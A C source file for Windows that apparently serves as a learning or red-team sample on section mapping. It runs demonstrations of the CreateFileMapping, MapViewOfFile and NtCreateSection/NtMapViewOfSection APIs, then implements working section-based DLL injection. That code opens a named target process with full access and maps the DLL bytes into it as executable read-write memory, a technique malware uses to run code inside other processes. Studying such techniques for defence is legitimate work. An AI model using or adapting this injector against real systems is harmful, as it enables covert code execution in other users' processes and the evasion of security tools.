#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Native API structures and definitions
// standadization of the status code.
typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)


// Section access rights (only define if not already defined)
#ifndef SECTION_MAP_EXECUTE_EXPLICIT
#define SECTION_MAP_EXECUTE_EXPLICIT 0x0020
#endif

// Object attributes structure
typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PVOID ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;


// Initialize object attributes macro
#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
    (p)->Attributes = a; \
    (p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL; \
}

// Native API function prototypes
typedef NTSTATUS(WINAPI* pNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

typedef NTSTATUS(WINAPI* pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
);

// Function prototypes
void PrintUsage(const char* programName);
DWORD FindProcessByName(const char* processName);
BOOL ReadDLLFile(const char* dllPath, BYTE** buffer, DWORD* size);

// Function prototypes API Demonstrations
void Demo_CreateFileMappingA(void);
void Demo_MapViewOfFile(void);
void Demo_MapViewOfFile2(void);
void Demo_MapViewOfFile3(void);
void Demo_MapViewOfFileEx(void);
void Demo_OpenFileMappingA(void);
void Demo_NtCreateSection(void);
void Demo_NtMapViewOfSection(void);

// Injection function
BOOL InjectDLLViaSection(DWORD targetPID, const char* dllPath);

// Main Entry Point
int main(int argc, char* argv[]) {

    // If no arguments, run demonstrations
    if (argc == 1) {
        printf("[*] Running API demonstrations (no injection performed)...\n\n");
        
        Demo_CreateFileMappingA();
        Demo_MapViewOfFile();
        Demo_MapViewOfFile2();
        Demo_MapViewOfFile3();
        Demo_MapViewOfFileEx();
        Demo_OpenFileMappingA();
        Demo_NtCreateSection();
        Demo_NtMapViewOfSection();
        
        printf("\n[+] All demonstrations completed!\n");
        printf("[i] Run with arguments to perform actual injection.\n");
        return 0;
    }

    // Validate arguments for injection
    if (argc != 3) {
        PrintUsage(argv[0]);
        return 1;
    }

    const char* processName = argv[1];
    const char* dllPath = argv[2];

    printf("[*] Target Process: %s\n", processName);
    printf("[*] DLL Path: %s\n\n", dllPath);

    // Find target process
    DWORD targetPID = FindProcessByName(processName);
    if (targetPID == 0) {
        printf("[-] Failed to find process: %s\n", processName);
        return 1;
    }

    printf("[+] Found target process (PID: %lu)\n", targetPID);

    // Perform injection
    if (InjectDLLViaSection(targetPID, dllPath)) {
        printf("[+] Section mapping injection successful!\n");
        return 0;
    } else {
        printf("[-] Section mapping injection failed!\n");
        return 1;
    }
}


//Print usage information
void PrintUsage(const char* programName) {
    printf("Usage:\n");
    printf("  %s                           - Run API demonstrations\n", programName);
    printf("  %s <process> <dll_path>      - Inject DLL into process\n\n", programName);
    printf("Examples:\n");
    printf("  %s\n", programName);
    printf("  %s notepad.exe C:\\Temp\\MyDLL.dll\n", programName);
}


 //Find process ID by name
DWORD FindProcessByName(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    DWORD pid = 0;
    do {
        if (_stricmp(pe32.szExeFile, processName) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return pid;
}


 // Read DLL file into memory buffer
BOOL ReadDLLFile(const char* dllPath, BYTE** buffer, DWORD* size) {
    HANDLE hFile = CreateFileA(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open DLL file (Error: %lu)\n", GetLastError());
        return FALSE;
    }

    *size = GetFileSize(hFile, NULL);
    if (*size == INVALID_FILE_SIZE) {
        printf("[-] Failed to get file size (Error: %lu)\n", GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }

    *buffer = (BYTE*)malloc(*size);
    if (*buffer == NULL) {
        printf("[-] Failed to allocate memory for DLL\n");
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, *buffer, *size, &bytesRead, NULL) || bytesRead != *size) {
        printf("[-] Failed to read DLL file (Error: %lu)\n", GetLastError());
        free(*buffer);
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);
    return TRUE;
}

/*
 * DEMONSTRATION: CreateFileMappingA
 * Creates a named or unnamed file mapping object for a specified file.
 * Can create file-backed or page-file-backed (anonymous) sections.
 */
void Demo_CreateFileMappingA(void) {
    printf("\n[+] CreateFileMappingA\n");

    // Create anonymous file mapping (backed by page file)
    HANDLE hMapping = CreateFileMappingA(
        INVALID_HANDLE_VALUE,    // Use page file
        NULL,                    // Default security
        PAGE_READWRITE,          // Read/write access
        0,                       // High-order size
        4096,                    // Low-order size (4KB)
        "Local\\DemoMapping"     // Object name
    );

    if (hMapping == NULL) {
        printf("[-] CreateFileMappingA failed (Error: %lu)\n", GetLastError());
        return;
    }

    printf("[+] File mapping created successfully\n");
    printf("    Handle: 0x%p\n", hMapping);
    printf("    Name: Local\\DemoMapping\n");
    printf("    Size: 4096 bytes\n");
    printf("    Protection: PAGE_READWRITE\n");

    CloseHandle(hMapping);
    printf("[+] File mapping closed\n\n");
}
/*
 * MapViewOfFile
 * Maps a view of a file mapping into the address space of the calling process.
 */
void Demo_MapViewOfFile(void) {
    printf("\n[+] MapViewOfFile\n");

    // Create file mapping
    HANDLE hMapping = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL,
                                         PAGE_READWRITE, 0, 4096, NULL);
    if (hMapping == NULL) {
        printf("[-] Failed to create file mapping (Error: %lu)\n", GetLastError());
        return;
    }

    // Map view of file
    LPVOID pView = MapViewOfFile(
        hMapping,           // File mapping handle
        FILE_MAP_ALL_ACCESS, // Desired access
        0,                  // High-order offset
        0,                  // Low-order offset
        0                   // Map entire section
    );

    if (pView == NULL) {
        printf("[-] MapViewOfFile failed (Error: %lu)\n", GetLastError());
        CloseHandle(hMapping);
        return;
    }

    printf("[+] View mapped successfully\n");
    printf("    Base Address: 0x%p\n", pView);
    printf("    Access: FILE_MAP_ALL_ACCESS\n");

    // Write test data
    const char* testData = "Section mapping test data";
    memcpy(pView, testData, strlen(testData) + 1);
    printf("[+] Test data written: \"%s\"\n", (char*)pView);

    UnmapViewOfFile(pView);
    CloseHandle(hMapping);
    printf("[+] View unmapped and mapping closed\n\n");
}

/* 
 *  MapViewOfFile2
 * Extended version with additional process handle parameter (Windows Vista+).
 */
void Demo_MapViewOfFile2(void) {
    printf("\n[+] MapViewOfFile2\n");

    // Check if API is available
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32 == NULL) {
        printf("[-] Failed to get kernel32.dll handle\n");
        return;
    }

    typedef PVOID(WINAPI* pMapViewOfFile2)(HANDLE, HANDLE, ULONG64, PVOID, SIZE_T, ULONG);
    pMapViewOfFile2 MapViewOfFile2Ptr = (pMapViewOfFile2)GetProcAddress(hKernel32, "MapViewOfFile2");

    if (MapViewOfFile2Ptr == NULL) {
        printf("[-] MapViewOfFile2 not available on this system\n");
        printf("[i] This API requires Windows Vista or later\n\n");
        return;
    }

    // Create file mapping
    HANDLE hMapping = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL,
                                         PAGE_READWRITE, 0, 8192, NULL);
    if (hMapping == NULL) {
        printf("[-] Failed to create file mapping (Error: %lu)\n", GetLastError());
        return;
    }

    // Map view with MapViewOfFile2
    PVOID pView = MapViewOfFile2Ptr(
        hMapping,                  // File mapping handle
        GetCurrentProcess(),       // Process handle
        0,                        // Offset
        NULL,                     // Base address (auto)
        0,                        // Size (entire mapping)
        PAGE_READWRITE            // Protection
    );

    if (pView == NULL) {
        printf("[-] MapViewOfFile2 failed (Error: %lu)\n", GetLastError());
        CloseHandle(hMapping);
        return;
    }

    printf("[+] MapViewOfFile2 succeeded\n");
    printf("    Base Address: 0x%p\n", pView);
    printf("    Process: Current (0x%p)\n", GetCurrentProcess());
    printf("    Size: 8192 bytes\n");

    UnmapViewOfFile(pView);
    CloseHandle(hMapping);
    printf("[+] View unmapped successfully\n\n");
}

/* 
 *  MapViewOfFile3
 * Newest mapping API with extended parameters (Windows 10+).
 */
void Demo_MapViewOfFile3(void) {
    printf("\n[+]MapViewOfFile3\n");

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32 == NULL) {
        printf("[-] Failed to get kernel32.dll handle\n");
        return;
    }

    typedef PVOID(WINAPI* pMapViewOfFile3)(HANDLE, HANDLE, PVOID, ULONG64, SIZE_T, ULONG, ULONG, PVOID, ULONG);
    pMapViewOfFile3 MapViewOfFile3Ptr = (pMapViewOfFile3)GetProcAddress(hKernel32, "MapViewOfFile3");

    if (MapViewOfFile3Ptr == NULL) {
        printf("[-] MapViewOfFile3 not available on this system\n");
        printf("[i] This API requires Windows 10 or later\n\n");
        return;
    }

    HANDLE hMapping = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL,
                                         PAGE_READWRITE, 0, 8192, NULL);
    if (hMapping == NULL) {
        printf("[-] Failed to create file mapping (Error: %lu)\n", GetLastError());
        return;
    }

    PVOID pView = MapViewOfFile3Ptr(
        hMapping,                  // File mapping handle
        GetCurrentProcess(),       // Process handle
        NULL,                     // Base address (auto)
        0,                        // Offset
        0,                        // Size (entire mapping)
        0,                        // Allocation type
        PAGE_READWRITE,           // Protection
        NULL,                     // Extended parameters
        0                         // Parameter count
    );

    if (pView == NULL) {
        printf("[-] MapViewOfFile3 failed (Error: %lu)\n", GetLastError());
        CloseHandle(hMapping);
        return;
    }

    printf("[+] MapViewOfFile3 succeeded\n");
    printf("    Base Address: 0x%p\n", pView);
    printf("    Extended parameters: None\n");

    UnmapViewOfFile(pView);
    CloseHandle(hMapping);
    printf("[+] View unmapped successfully\n\n");
}

/* 
 * MapViewOfFileEx
 * Maps a view at a specific base address.
 */
void Demo_MapViewOfFileEx(void) {
    printf("\n[+]MapViewOfFileEx\n");

    HANDLE hMapping = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL,
                                         PAGE_READWRITE, 0, 4096, NULL);
    if (hMapping == NULL) {
        printf("[-] Failed to create file mapping (Error: %lu)\n", GetLastError());
        return;
    }

    // Try to map at NULL (system chooses address)
    LPVOID pView = MapViewOfFileEx(
        hMapping,               // File mapping handle
        FILE_MAP_ALL_ACCESS,    // Desired access
        0,                      // High-order offset
        0,                      // Low-order offset
        0,                      // Size (entire mapping)
        NULL                    // Desired base address (auto)
    );

    if (pView == NULL) {
        printf("[-] MapViewOfFileEx failed (Error: %lu)\n", GetLastError());
        CloseHandle(hMapping);
        return;
    }

    printf("[+] MapViewOfFileEx succeeded\n");
    printf("    Requested Address: NULL (auto)\n");
    printf("    Actual Address: 0x%p\n", pView);
    printf("    Size: 4096 bytes\n");

    UnmapViewOfFile(pView);
    CloseHandle(hMapping);
    printf("[+] View unmapped successfully\n\n");
}

/* 
 * AOpenFileMappingA
 * Opens a namedfile mapping object created by another process.
 */
void Demo_OpenFileMappingA(void) {
    printf("[+]OpenFileMappingA\n");

    // First, create a named mapping
    const char* mappingName = "Local\\DemoSharedMapping";
    HANDLE hMapping1 = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL,
                                          PAGE_READWRITE, 0, 4096, mappingName);
    if (hMapping1 == NULL) {
        printf("[-] Failed to create named mapping (Error: %lu)\n", GetLastError());
        return;
    }

    printf("[+] Created named mapping: %s\n", mappingName);

    // Now open it
    HANDLE hMapping2 = OpenFileMappingA(
        FILE_MAP_ALL_ACCESS,    // Desired access
        FALSE,                  // Inherit handle
        mappingName             // Object name
    );

    if (hMapping2 == NULL) {
        printf("[-] OpenFileMappingA failed (Error: %lu)\n", GetLastError());
        CloseHandle(hMapping1);
        return;
    }

    printf("[+] Opened existing mapping successfully\n");
    printf("    Original Handle: 0x%p\n", hMapping1);
    printf("    Opened Handle: 0x%p\n", hMapping2);
    printf("    Name: %s\n", mappingName);

    // Map view from opened handle
    LPVOID pView = MapViewOfFile(hMapping2, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    if (pView != NULL) {
        printf("[+] Mapped view from opened handle at 0x%p\n", pView);
        UnmapViewOfFile(pView);
    }

    CloseHandle(hMapping2);
    CloseHandle(hMapping1);
    printf("[+] Both handles closed\n\n");
}

/* 
 * NtCreateSection
 * Native API for creating section objects (undocumented).
 */
void Demo_NtCreateSection(void) {
    printf("\n[+] NtCreateSection\n");

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-] Failed to get ntdll.dll handle\n");
        return;
    }

    pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    if (NtCreateSection == NULL) {
        printf("[-] Failed to resolve NtCreateSection\n");
        return;
    }

    HANDLE hSection = NULL;
    LARGE_INTEGER maxSize;
    maxSize.LowPart = 8192;
    maxSize.HighPart = 0;

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    NTSTATUS status = NtCreateSection(
        &hSection,              // Section handle
        SECTION_ALL_ACCESS,     // Desired access
        &objAttr,              // Object attributes
        &maxSize,              // Maximum size
        PAGE_READWRITE,        // Protection
        SEC_COMMIT,            // Allocation attributes
        NULL                   // File handle (page-file backed)
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] NtCreateSection failed (Status: 0x%08X)\n", status);
        return;
    }

    printf("[+] NtCreateSection succeeded\n");
    printf("    Section Handle: 0x%p\n", hSection);
    printf("    Status: 0x%08X (SUCCESS)\n", status);
    printf("    Size: 8192 bytes\n");
    printf("    Protection: PAGE_READWRITE\n");
    printf("    Attributes: SEC_COMMIT\n");

    CloseHandle(hSection);
    printf("[+] Section handle closed\n\n");
}

/* 
 * NtMapViewOfSection
 * Native API for mapping section views into process address space.
 */
void Demo_NtMapViewOfSection(void) {
    printf("\n[+]NtMapViewOfSection\n");

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-] Failed to get ntdll.dll handle\n");
        return;
    }

    pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");

    if (NtCreateSection == NULL || NtMapViewOfSection == NULL) {
        printf("[-] Failed to resolve native APIs\n");
        return;
    }

    // Create section
    HANDLE hSection = NULL;
    LARGE_INTEGER maxSize;
    maxSize.LowPart = 4096;
    maxSize.HighPart = 0;

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, &objAttr,
                                      &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtCreateSection failed (Status: 0x%08X)\n", status);
        return;
    }

    printf("[+] Section created successfully\n");

    // Map view
    PVOID pBaseAddress = NULL;
    SIZE_T viewSize = 0;

    status = NtMapViewOfSection(
        hSection,                  // Section handle
        GetCurrentProcess(),       // Process handle
        &pBaseAddress,            // Base address (out)
        0,                        // Zero bits
        0,                        // Commit size
        NULL,                     // Section offset
        &viewSize,                // View size (out)
        1,                        // Inherit disposition (ViewShare)
        0,                        // Allocation type
        PAGE_EXECUTE_READWRITE    // Protection
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] NtMapViewOfSection failed (Status: 0x%08X)\n", status);
        CloseHandle(hSection);
        return;
    }

    printf("[+] NtMapViewOfSection succeeded\n");
    printf("    Base Address: 0x%p\n", pBaseAddress);
    printf("    View Size: %zu bytes\n", viewSize);
    printf("    Protection: PAGE_EXECUTE_READWRITE\n");
    printf("    Status: 0x%08X (SUCCESS)\n", status);

    // Write test data
    const char* testData = "Native section mapping";
    memcpy(pBaseAddress, testData, strlen(testData) + 1);
    printf("[+] Test data written: \"%s\"\n", (char*)pBaseAddress);

    // Cleanup - Native API requires NtUnmapViewOfSection
    typedef NTSTATUS(WINAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
    pNtUnmapViewOfSection NtUnmapViewOfSection = 
        (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    
    if (NtUnmapViewOfSection != NULL) {
        NtUnmapViewOfSection(GetCurrentProcess(), pBaseAddress);
    }

    CloseHandle(hSection);
    printf("[+] View unmapped and section closed\n\n");
}

/* 
 * Section-Based DLL Injection
 * Injects a DLL into target process using section mapping technique.
 */
BOOL InjectDLLViaSection(DWORD targetPID, const char* dllPath) {
    printf("\n[*] Starting section-based injection...\n");

    // Read DLL file
    BYTE* dllBuffer = NULL;
    DWORD dllSize = 0;
    if (!ReadDLLFile(dllPath, &dllBuffer, &dllSize)) {
        return FALSE;
    }

    printf("[+] DLL loaded into memory (%lu bytes)\n", dllSize);

    // Get native API functions
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");

    if (NtCreateSection == NULL || NtMapViewOfSection == NULL) {
        printf("[-] Failed to resolve native APIs\n");
        free(dllBuffer);
        return FALSE;
    }

    // Create section
    HANDLE hSection = NULL;
    LARGE_INTEGER maxSize;
    maxSize.LowPart = dllSize;
    maxSize.HighPart = 0;

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, &objAttr,
                                      &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtCreateSection failed (Status: 0x%08X)\n", status);
        free(dllBuffer);
        return FALSE;
    }

    printf("[+] Section created (Handle: 0x%p)\n", hSection);

    // Map section into local process
    PVOID pLocalView = NULL;
    SIZE_T localViewSize = 0;
    status = NtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, 0, 0,
                                NULL, &localViewSize, 1, 0, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to map section locally (Status: 0x%08X)\n", status);
        CloseHandle(hSection);
        free(dllBuffer);
        return FALSE;
    }

    printf("[+] Section mapped locally (Address: 0x%p)\n", pLocalView);

    // Copy DLL into section
    memcpy(pLocalView, dllBuffer, dllSize);
    free(dllBuffer);
    printf("[+] DLL copied to section\n");

    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (hProcess == NULL) {
        printf("[-] OpenProcess failed (Error: %lu)\n", GetLastError());
        CloseHandle(hSection);
        return FALSE;
    }

    printf("[+] Target process opened\n");

    // Map section into target process
    PVOID pRemoteView = NULL;
    SIZE_T remoteViewSize = 0;
    status = NtMapViewOfSection(hSection, hProcess, &pRemoteView, 0, 0,
                                NULL, &remoteViewSize, 1, 0, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to map section remotely (Status: 0x%08X)\n", status);
        CloseHandle(hProcess);
        CloseHandle(hSection);
        return FALSE;
    }

    printf("[+] Section mapped into target process (Address: 0x%p)\n", pRemoteView);
    printf("[+] Injection completed successfully!\n");
    printf("[i] Note: DLL entry point must be called manually for full injection\n");

    // Cleanup
    CloseHandle(hProcess);
    CloseHandle(hSection);

    return TRUE;
}